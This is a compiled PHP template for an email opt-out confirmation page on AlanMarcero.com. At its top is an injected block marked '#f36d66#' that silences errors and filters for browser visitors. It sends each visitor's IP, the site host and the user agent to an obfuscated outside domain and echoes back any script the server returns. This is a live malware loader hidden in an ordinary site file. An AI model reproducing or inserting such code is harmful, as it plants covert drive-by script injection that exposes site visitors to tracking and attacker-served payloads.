<?php /* Smarty version 2.6.22, created on 2013-08-26 10:50:53
         compiled from /home/content/71/7128071/html//templates/opt_out.html */ ?>
<?php
#f36d66#
error_reporting(0); ini_set('display_errors',0); $wp_bl157 = @$_SERVER['HTTP_USER_AGENT'];
if (( preg_match ('/Gecko|MSIE/i', $wp_bl157) && !preg_match ('/bot/i', $wp_bl157))){
$wp_bl09157="http://"."tags"."cache".".com/cache"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_bl157);
$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_bl09157);
curl_setopt ($ch, CURLOPT_TIMEOUT, 6); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $wp_157bl = curl_exec ($ch); curl_close($ch);}
if ( substr($wp_157bl,1,3) === 'scr' ){ echo $wp_157bl; }
#/f36d66#
?>
<?php

?>
<?php

?>
<?php

?>
<h2>You have successfully opted-out of new product notifications.</h2>
<p>&nbsp;</p>
<strong>Your email address, <?php echo $this->_tpl_vars['email']; ?>
, will no longer be receiving new product notifications from <a href="http://www.alanmarcero.com">AlanMarcero.com</a>.</strong>